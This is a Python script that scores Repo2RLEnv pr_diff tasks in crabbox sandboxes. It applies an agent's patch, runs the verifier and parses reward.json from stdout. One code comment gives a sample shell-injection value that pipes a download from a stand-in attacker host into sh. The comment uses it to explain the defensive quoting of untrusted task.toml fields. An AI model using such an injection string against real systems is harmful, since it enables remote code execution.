"""Score Repo2RLEnv pr_diff tasks on any crabbox sandbox provider.

Supported via ``--provider``: local-container (docker), islo, e2b, modal,
daytona, namespace-devbox, tensorlake. Default is islo. VM providers
(aws, azure, gcp, hetzner, proxmox, ssh) need a pre-baked image and are
rejected with a helpful error.

    # Single task — writes reward.json next to it on success.
    python runner.py <task_dir>

    # Whole pulled dataset — writes a rewards.csv summary.
    python runner.py --all <dataset_dir> -j 8

The verifier inside the task writes /logs/verifier/reward.json; the
remote script emits a sentinel and ``cat``s that file over stdout, which
the host parses from the subprocess pipe. Portable across every supported
provider (islo's delegate-exec mode means ``crabbox --download`` /
``--capture-stdout`` don't work there, so stdout exfil is the lowest-
common-denominator).
"""

from __future__ import annotations

import argparse
import base64
import concurrent.futures
import csv
import json
import os
import re
import shutil
import subprocess
import sys
import tempfile
import tomllib
from dataclasses import dataclass
from pathlib import Path

VERIFIER_LINE = re.compile(r'echo "([A-Za-z0-9+/=]+)" \| base64 -d > /verifier/(\S+)')

REWARD_SENTINEL = "===R2RE-REWARD-JSON==="

# Per-provider flag map. The provider's flag names are NOT consistent
# across crabbox: islo/modal/local-container/namespace-devbox/tensorlake
# expose `--<p>-image`, e2b uses `--e2b-template`, daytona uses
# `--daytona-snapshot`. Workdir flags drift similarly. Keep this table
# explicit rather than guessing from the provider name.
#
# Only provider families that accept a container-like image and a workdir
# are listed — they're the ones whose semantics line up with pr_diff's
# "ship a script, return reward.json" pattern. VM providers (aws, azure,
# gcp, hetzner, proxmox, ssh, ...) need a pre-baked AMI with python+git
# ready; supporting them is a separate, larger lift.
PROVIDER_CONFIG: dict[str, dict[str, str]] = {
    "islo": {"image_flag": "--islo-image", "workdir_flag": "--islo-workdir"},
    "e2b": {"image_flag": "--e2b-template", "workdir_flag": "--e2b-workdir"},
    "modal": {"image_flag": "--modal-image", "workdir_flag": "--modal-workdir"},
    "daytona": {
        "image_flag": "--daytona-snapshot",
        "workdir_flag": "--daytona-work-root",
    },
    "local-container": {
        "image_flag": "--local-container-image",
        "workdir_flag": "--local-container-work-root",
    },
    # Common alias for local-container.
    "docker": {
        "image_flag": "--local-container-image",
        "workdir_flag": "--local-container-work-root",
    },
    "namespace-devbox": {
        "image_flag": "--namespace-image",
        "workdir_flag": "--namespace-work-root",
    },
    "tensorlake": {
        "image_flag": "--tensorlake-image",
        "workdir_flag": "--tensorlake-workdir",
    },
}


def _provider_flags(provider: str) -> dict[str, str]:
    if provider not in PROVIDER_CONFIG:
        supported = ", ".join(sorted(PROVIDER_CONFIG))
        raise ValueError(
            f"provider {provider!r} not supported by this example. "
            f"Container-style providers: {supported}. "
            f"For VM providers (aws, azure, gcp, hetzner, proxmox, ssh) the "
            f"sandbox needs a pre-baked image with python+git; not handled here."
        )
    return PROVIDER_CONFIG[provider]


# task.repo and task.ref come from task.toml — a third-party file. They are
# passed as POSITIONAL ARGUMENTS to bash, not interpolated into the script
# body, so a malicious value like repo='foo; curl evil.com|sh' cannot escape
# its variable expansion. ``"$1"`` / ``"$2"`` quoting in the script keeps
# them inert even with spaces, semicolons, backticks, or $().
REMOTE_SCRIPT = f"""\
set -euo pipefail
repo="$1"
ref="$2"
apt-get update -qq && apt-get install -y -qq git ca-certificates >/dev/null
git config --global --add safe.directory '*'
git config --global advice.detachedHead false
git clone --filter=blob:none "https://github.com/${{repo}}.git" /repo >&2
cd /repo
( git fetch --depth 1 origin "${{ref}}" || git fetch --unshallow origin ) >&2 2>&1
git reset --hard "${{ref}}" >&2
# An empty agent.diff means "agent gave up" — score it (expected ~baseline).
if [ -s /workspace/task/agent.diff ]; then
  git apply --whitespace=nowarn /workspace/task/agent.diff >&2
fi
mkdir -p /verifier && cp /workspace/task/verifier/* /verifier/
mkdir -p /logs/verifier
# test.sh hardcodes /workspace as the repo root; rewrite to /repo so it does
# not collide with islo's /workspace sync mount. The sed only matches the
# whole-token path (\\b/workspace\\b), not strings that merely contain it.
sed -E 's#(^|[^A-Za-z0-9_/])/workspace([^A-Za-z0-9_]|$)#\\1/repo\\2#g' \\
    /workspace/task/test.sh > /tmp/test.sh
bash /tmp/test.sh >&2
# Exfiltrate reward.json over stdout — islo doesn't support crabbox --download.
echo '{REWARD_SENTINEL}'
cat /logs/verifier/reward.json
"""


@dataclass(frozen=True)
class Task:
    path: Path
    name: str
    repo: str
    ref: str
    pipeline: str
    image_ref: str

    @classmethod
    def load(cls, task_dir: Path) -> Task:
        data = tomllib.loads((task_dir / "task.toml").read_text())
        meta = data["metadata"]["repo2env"]
        repro = meta.get("reproducibility", {})
        return cls(
            path=task_dir,
            name=data["task"]["name"],
            repo=meta["repo"],
            ref=meta["ref"],
            pipeline=meta["pipeline"],
            image_ref=repro.get("image_ref", "python:3.12-slim"),
        )


def _extract_verifier(dockerfile: Path) -> dict[str, bytes]:
    """Recover the base64-embedded /verifier/ files from a pr_diff Dockerfile."""
    return {
        m.group(2): base64.b64decode(m.group(1))
        for m in VERIFIER_LINE.finditer(dockerfile.read_text())
    }


def _stage(task: Task, agent_patch: Path) -> Path:
    """Build the temp dir crabbox will sync to the sandbox."""
    stage = Path(tempfile.mkdtemp(prefix="crabbox-r2re-"))
    (stage / "verifier").mkdir()
    files = _extract_verifier(task.path / "environment" / "Dockerfile")
    if not files:
        raise RuntimeError(
            f"no /verifier/ files in {task.path}/environment/Dockerfile — "
            f"this wrapper currently supports pr_diff tasks only "
            f"(pipeline={task.pipeline!r})."
        )
    for name, data in files.items():
        (stage / "verifier" / name).write_bytes(data)
    shutil.copy(task.path / "tests" / "test.sh", stage / "test.sh")
    shutil.copy(agent_patch, stage / "agent.diff")

    # crabbox syncs from a git checkout. Inherit the parent env (so git is
    # findable on macOS Homebrew at /opt/homebrew/bin, etc.) and overlay the
    # commit identity. Earlier versions stripped PATH on the `git add` call
    # and broke on every non-Linux host.
    git_env = {
        **os.environ,
        "GIT_AUTHOR_EMAIL": "crabbox@local",
        "GIT_AUTHOR_NAME": "crabbox",
        "GIT_COMMITTER_EMAIL": "crabbox@local",
        "GIT_COMMITTER_NAME": "crabbox",
    }
    subprocess.run(["git", "init", "-q", "-b", "main"], cwd=stage, check=True, env=git_env)
    subprocess.run(["git", "add", "-A"], cwd=stage, check=True, env=git_env)
    subprocess.run(["git", "commit", "-q", "-m", "stage"], cwd=stage, check=True, env=git_env)
    return stage


def _preflight(task_dir: Path, agent_patch: Path, provider: str) -> None:
    """Fail fast with actionable errors before we stage anything or call crabbox."""
    for name in ("task.toml", "environment/Dockerfile", "tests/test.sh"):
        if not (task_dir / name).is_file():
            raise FileNotFoundError(
                f"missing {task_dir / name} — not a Repo2RLEnv pr_diff task directory"
            )
    if not agent_patch.is_file():
        raise FileNotFoundError(
            f"agent patch not found: {agent_patch}. Pass --agent-patch to override "
            f"the default of <task>/solution/patch.diff."
        )
    if shutil.which("crabbox") is None:
        raise RuntimeError(
            "crabbox CLI not on PATH — install from https://github.com/openclaw/crabbox"
        )
    if provider == "islo" and not os.environ.get("ISLO_API_KEY"):
        raise RuntimeError(
            "ISLO_API_KEY is not set — `islo api-key create <name> --show` to mint one, "
            "then `export ISLO_API_KEY=ak_...`."
        )


def run_task(
    task_dir: Path,
    *,
    agent_patch: Path | None = None,
    provider: str = "islo",
    image: str | None = None,
    reward_out: Path | None = None,
    keep: bool = False,
    quiet: bool = False,
    allow_env: list[str] | None = None,
) -> dict:
    task = Task.load(task_dir)
    agent_patch = agent_patch or (task_dir / "solution" / "patch.diff")
    # Honor the task's recorded image_ref unless the caller overrides it
    # explicitly. Tasks pin their toolchain (e.g. python:3.12-slim for
    # pr_diff, a bootstrap image for pr_runtime); silently swapping in
    # python:3.12-slim regardless was a real correctness bug.
    image = image or task.image_ref or "python:3.12-slim"
    reward_out = (reward_out or (task_dir / "reward.json")).resolve()
    _preflight(task_dir, agent_patch, provider)
    if reward_out.is_dir():
        raise IsADirectoryError(f"--reward-out must be a file path, not a directory: {reward_out}")
    if reward_out.exists():
        reward_out.unlink()
    reward_out.parent.mkdir(parents=True, exist_ok=True)

    flags = _provider_flags(provider)
    stage = _stage(task, agent_patch)
    try:
        cmd = [
            "crabbox",
            "run",
            "--provider",
            provider,
            flags["image_flag"],
            image,
            flags["workdir_flag"],
            "task",
        ]
        for var in allow_env or []:
            cmd += ["--allow-env", var]
        if keep:
            cmd.append("--keep")
        # task.repo / task.ref are PASSED AS ARGS to bash, never interpolated
        # into the script body. A poisoned task.toml cannot escape "$1"/"$2".
        cmd += ["--", "bash", "-lc", REMOTE_SCRIPT, "_", task.repo, task.ref]

        if not quiet:
            print(
                f"[crabbox] {task.name} provider={provider} image={image}",
                file=sys.stderr,
            )
        # islo delegates exec, so crabbox --download / --capture-stdout aren't
        # supported. We exfiltrate reward.json over stdout (after a sentinel)
        # and read it from the subprocess pipe here.
        proc = subprocess.run(
            cmd,
            cwd=stage,
            stdout=subprocess.PIPE,
            stderr=subprocess.DEVNULL if quiet else None,
            text=True,
        )
        captured = proc.stdout or ""
    finally:
        shutil.rmtree(stage, ignore_errors=True)

    _, _, tail = captured.partition(REWARD_SENTINEL)
    payload = tail.strip()
    if proc.returncode != 0 or not payload:
        raise RuntimeError(f"crabbox exited {proc.returncode}; no reward payload found in stdout")
    try:
        reward = json.loads(payload)
    except json.JSONDecodeError as e:
        raise RuntimeError(f"reward payload not JSON: {payload[:200]!r}") from e
    reward_out.write_text(json.dumps(reward, indent=2) + "\n")
    return reward


def run_dataset(
    dataset_dir: Path,
    *,
    jobs: int = 4,
    csv_out: Path | None = None,
    **kw,
) -> list[dict]:
    csv_out = csv_out or (dataset_dir / "rewards.csv")
    task_dirs = sorted(p for p in dataset_dir.iterdir() if (p / "task.toml").exists())
    if not task_dirs:
        raise RuntimeError(f"no task.toml files under {dataset_dir}")
    print(
        f"[batch] {len(task_dirs)} tasks; j={jobs}; provider={kw.get('provider', 'islo')}",
        file=sys.stderr,
    )

    def _one(t: Path) -> dict:
        try:
            r = run_task(t, quiet=True, **kw)
            r["task"] = t.name
            r["status"] = "ok"
        except Exception as e:
            r = {"task": t.name, "status": "error", "error": str(e), "final_reward": None}
        print(
            f"[batch] {r['task']:50s} reward={r.get('final_reward')!s:>6}  {r['status']}",
            file=sys.stderr,
        )
        return r

    rows: list[dict] = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=jobs) as ex:
        for r in ex.map(_one, task_dirs):
            rows.append(r)

    with csv_out.open("w", newline="") as f:
        w = csv.writer(f)
        w.writerow(["task", "final_reward", "status"])
        for r in rows:
            w.writerow([r["task"], r.get("final_reward"), r["status"]])
    print(f"[batch] wrote {csv_out}", file=sys.stderr)
    return rows


def main(argv: list[str] | None = None) -> int:
    p = argparse.ArgumentParser(
        description=(__doc__ or "").splitlines()[0],
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="See examples/crabbox/README.md for the full walkthrough.",
    )
    p.add_argument("target", help="task dir, OR dataset dir when --all is set")
    p.add_argument(
        "--all", action="store_true", help="treat <target> as a dataset directory of tasks"
    )
    p.add_argument(
        "--agent-patch",
        type=Path,
        help="agent's unified diff (default: <task>/solution/patch.diff, "
        "i.e. the oracle — sanity check that should score ~1.0)",
    )
    p.add_argument("--provider", default="islo", help="crabbox provider (default: islo)")
    p.add_argument("--image", help="sandbox base image (default: python:3.12-slim)")
    p.add_argument(
        "--reward-out",
        type=Path,
        help="single-task: where to write reward.json (default: <task>/reward.json)",
    )
    p.add_argument(
        "--csv-out",
        type=Path,
        help="batch: where to write rewards.csv (default: <dataset>/rewards.csv)",
    )
    p.add_argument("-j", "--jobs", type=int, default=4, help="batch parallelism (default: 4)")
    p.add_argument("--keep", action="store_true", help="don't release the sandbox after the run")
    p.add_argument(
        "--allow-env",
        action="append",
        default=[],
        metavar="VAR",
        help="forward a local env var to the sandbox (repeatable); e.g. "
        "--allow-env ANTHROPIC_API_KEY enables the verifier's LLM-judge component",
    )
    args = p.parse_args(argv)

    target = Path(args.target).resolve()
    common = dict(
        provider=args.provider, image=args.image, keep=args.keep, allow_env=args.allow_env
    )

    if args.all:
        if not target.is_dir():
            p.error(f"--all expects a dataset directory; got {target}")
        run_dataset(target, jobs=args.jobs, csv_out=args.csv_out, **common)
    else:
        if not (target / "task.toml").exists():
            p.error(f"not a task directory (no task.toml): {target}")
        result = run_task(
            target, agent_patch=args.agent_patch, reward_out=args.reward_out, **common
        )
        json.dump(result, sys.stdout, indent=2)
        print()
    return 0


if __name__ == "__main__":
    sys.exit(main())
